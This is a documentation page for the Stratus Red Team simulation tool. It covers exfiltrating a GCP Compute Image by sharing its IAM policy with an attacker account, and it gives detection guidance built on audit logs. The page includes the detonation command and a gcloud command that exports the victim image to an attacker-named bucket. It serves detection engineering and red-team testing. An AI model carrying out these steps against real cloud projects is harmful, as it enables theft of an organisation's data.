---
title: Exfiltrate Compute Image by sharing it
---

# Exfiltrate Compute Image by sharing it

 <span class="smallcaps w3-badge w3-orange w3-round w3-text-sand" title="This attack technique might be slow to warm up or detonate">slow</span> 
 <span class="smallcaps w3-badge w3-blue w3-round w3-text-white" title="This attack technique can be detonated multiple times">idempotent</span> 

Platform: GCP

## MITRE ATT&CK Tactics


- Exfiltration

## Description


Exfiltrates a Compute Image by sharing with a fictitious attacker account. The attacker could then create a snapshot of the image in their GCP project.

<span style="font-variant: small-caps;">Warm-up</span>:

- Create a Compute Image

<span style="font-variant: small-caps;">Detonation</span>:

- Set the IAM policy of the image so that the attacker account has permissions to read the image in their own project

!!! note

	Since the target e-mail must exist for this attack simulation to work, Stratus Red Team grants the role to stratusredteam@gmail.com by default.
	This is a real Google account, owned by Stratus Red Team maintainers and that is not used for any other purpose than this attack simulation. However, you can override
	this behavior by setting the environment variable <code>STRATUS_RED_TEAM_ATTACKER_EMAIL</code>, for instance:

	```bash
	export STRATUS_RED_TEAM_ATTACKER_EMAIL="your-own-gmail-account@gmail.com"
	stratus detonate gcp.exfiltration.share-compute-image
	```


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate gcp.exfiltration.share-compute-image
```
## Detection


You can detect when someone changes the IAM policy of a Compute Image, using the GCP Admin Activity audit logs event <code>v1.compute.images.setIamPolicy</code>. Here's a sample event, shortened for clarity:

```json hl_lines="18 20 25""
{
  "protoPayload": {
    "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
    "authenticationInfo": {
      "principalEmail": "user-sharing-the-image@domain.tld",
      "principalSubject": "user:user-sharing-the-image@domain.tld"
    },
    "requestMetadata": {
      "callerIp": "34.33.32.31",
      "callerSuppliedUserAgent": "google-cloud-sdk gcloud/..."
    },
    "resourceName": "projects/victim-project/global/images/stratus-red-team-victim-image",
    "request": {
      "policy": {
        "version": "3",
        "bindings": [
          {
            "role": "roles/owner",
            "members": [
              "user:attacker@gmail.com"
            ]
          }
        ]
      },
      "@type": "type.googleapis.com/compute.images.setIamPolicy"
    }
  }
}
```

After the attacker has permissions on the Compute Image, they can export it in their own GCP Storage using:

```bash
	gcloud compute images export \
	--destination-uri gs://attacker-bucket/victim-image \
	--image stratus-red-team-victim-image
```

Based on this event, detection strategies may include:

- Alerting when the IAM policy of a Compute Image is changed, especially if such a sharing mechanism is not part of your normal operations. Sample GCP Logs Explorer query:

```sql
protoPayload.methodName="v1.compute.images.setIamPolicy"
```


